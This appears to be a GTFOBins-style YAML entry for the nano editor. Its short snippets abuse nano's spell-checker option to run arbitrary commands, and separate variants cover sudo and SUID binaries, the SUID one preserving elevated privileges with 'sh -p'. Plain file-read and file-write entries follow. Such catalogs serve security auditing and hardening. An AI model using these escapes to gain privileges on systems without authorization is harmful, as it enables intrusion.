---
functions:
  execute-non-interactive:
    - description: After running this exit the editor to see the command output.
      code: |
        COMMAND=id
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        nano -s $TF
        ^T
  sudo-enabled:
    - description: After running this exit the editor to see the command output.
      code: |
        COMMAND=id
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo nano -s $TF
        ^T
  suid-enabled:
    - description: After running this exit the editor to see the command output.
      code: |-
        COMMAND=id
        TF=$(mktemp)
        echo $'#!/bin/sh -p\n'"$COMMAND" > $TF
        chmod +x $TF
        ./nano -s $TF
        ^T
  file-read:
    - code: |
        nano file_to_read
  file-write:
    - code: |
        nano file_to_write
        ^O
---
